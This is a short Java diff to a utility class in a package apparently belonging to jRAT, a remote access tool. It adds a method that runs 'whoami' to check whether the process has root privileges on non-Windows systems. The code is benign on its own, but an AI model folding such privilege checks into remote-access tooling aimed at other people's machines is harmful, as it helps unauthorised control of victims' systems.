@@ -1,6 +1,9 @@
 package io.jrat.common.utils;
 
+import com.redpois0n.oslib.OperatingSystem;
 import java.awt.GraphicsEnvironment;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.util.Random;
 
 public class Utils {
@@ -27,4 +30,8 @@ public class Utils {
 		return GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance();
 	}
 
+
+	public static boolean isRoot() throws Exception {
+		return OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
+	}
 }
